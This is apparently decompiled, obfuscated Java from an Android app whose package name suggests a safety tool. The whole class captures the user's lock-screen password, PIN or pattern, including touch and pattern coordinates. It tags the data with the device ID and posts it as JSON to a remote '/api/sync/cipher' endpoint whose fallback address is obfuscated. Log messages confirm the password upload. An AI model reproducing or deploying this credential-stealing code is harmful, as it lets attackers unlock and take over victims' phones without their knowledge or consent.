package com.storm.safe.rock.service.modules.cipher;

import android.graphics.Rect;
import android.provider.Settings;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0715je;
import p000.C0598hx;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$uploadCipherToServer$1", m214403f = "CipherCaptureManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class CipherCaptureManager$uploadCipherToServer$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0335a1 f53223a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0598hx f53224a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public CipherCaptureManager$uploadCipherToServer$1(C0335a1 c0335a1, C0598hx c0598hx, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53223a1 = c0335a1;
        this.f53224a2 = c0598hx;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new CipherCaptureManager$uploadCipherToServer$1(this.f53223a1, this.f53224a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        CipherCaptureManager$uploadCipherToServer$1 cipherCaptureManager$uploadCipherToServer$1 = (CipherCaptureManager$uploadCipherToServer$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        cipherCaptureManager$uploadCipherToServer$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String strM212470a0;
        C0323a8 c0323a8M211471g5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            String string = Settings.Secure.getString(this.f53223a1.f53287a1.getContentResolver(), "android_id");
            JSONObject jSONObject = new JSONObject();
            C0598hx c0598hx = this.f53224a2;
            C0335a1 c0335a1 = this.f53223a1;
            jSONObject.put("deviceId", string);
            Object obj2 = c0598hx.f56761a1;
            if (obj2 == null) {
                obj2 = "";
            }
            jSONObject.put("textCipher", obj2);
            String str = c0598hx.f56760a0;
            jSONObject.put("cipherType", t60.m214686a2(str, "PASSWORD_QUALITY_PATTERN") ? "pattern" : t60.m214686a2(str, C0335a1.f53283c5.getQUALITY_NUMERIC()) ? true : t60.m214686a2(str, "PASSWORD_QUALITY_NUMERIC_COMPLEX") ? "pin" : "password");
            jSONObject.put("cipherGradeCode", c0598hx.f56760a0);
            List list = c0598hx.f56762a2;
            jSONObject.put("patternCipher", list != null ? AbstractC0715je.m213295i2(list, ",", null, null, null, 62) : "");
            List<android.graphics.Point> list2 = c0598hx.f56763a3;
            if (list2 != null) {
                JSONArray jSONArray = new JSONArray();
                for (android.graphics.Point point : list2) {
                    JSONArray jSONArray2 = new JSONArray();
                    jSONArray2.put(point.x);
                    jSONArray2.put(point.y);
                    jSONArray.put(jSONArray2);
                }
                jSONObject.put("patternScreenPoints", jSONArray);
            }
            jSONObject.put("isLocked", c0598hx.f56764a4);
            jSONObject.put("captureTime", c0598hx.f56765a5);
            Rect rect = c0598hx.f56766a6;
            if (rect != null) {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("left", rect.left);
                jSONObject2.put("top", rect.top);
                jSONObject2.put("right", rect.right);
                jSONObject2.put("bottom", rect.bottom);
                jSONObject.put("boundsInScreen", jSONObject2);
            }
            Rect rect2 = c0598hx.f56767a7;
            if (rect2 != null) {
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put("left", rect2.left);
                jSONObject3.put("top", rect2.top);
                jSONObject3.put("right", rect2.right);
                jSONObject3.put("bottom", rect2.bottom);
                jSONObject.put("boundsInParent", jSONObject3);
            }
            List list3 = c0598hx.f56768a8;
            if (list3 != null) {
                JSONArray jSONArray3 = new JSONArray();
                Iterator it = list3.iterator();
                while (it.hasNext()) {
                    jSONArray3.put(new JSONArray((Collection<?>) it.next()));
                }
                jSONObject.put("touchCipher", jSONArray3);
            }
            if (c0335a1.f53295a9 > 0) {
                jSONObject.put("lockBatchId", String.valueOf(c0335a1.f53295a9));
            }
            RequestBody.Companion companion = RequestBody.Companion;
            String string2 = jSONObject.toString();
            t60.m214694b5(string2, "json.toString()");
            RequestBody requestBodyCreate = companion.create(string2, MediaType.Companion.get("application/json"));
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 == null || (c0323a8M211471g5 = c0290a0.m211471g5()) == null || (strM212470a0 = c0323a8M211471g5.m211644b0()) == null) {
                strM212470a0 = StringUtil.m212470a0("I00FKl5iQ2FAJjwXEzZMOwctViVzAUF0XjADPg==");
            }
            Request.Builder builderUrl = new Request.Builder().url(strM212470a0 + "/api/sync/cipher");
            t60.m214694b5(string, "deviceId");
            Response responseExecute = this.f53223a1.f53292a6.newCall(builderUrl.header("X-Client-ID", string).post(requestBodyCreate).build()).execute();
            C0598hx c0598hx2 = this.f53224a2;
            try {
                if (responseExecute.isSuccessful()) {
                    t60.m214714d6("CipherCaptureManager", "✅ 密码已上传到 go-server: type=" + c0598hx2.f56760a0);
                } else {
                    t60.m214726f4("CipherCaptureManager", "⚠️ 密码上传响应: " + responseExecute.code());
                }
                responseExecute.close();
            } finally {
            }
        } catch (Exception e) {
            tz0.m214807a7("上传密码到 go-server 异常: ", e.getMessage(), "CipherCaptureManager");
        }
        return C1351vv.f60710b1;
    }
}
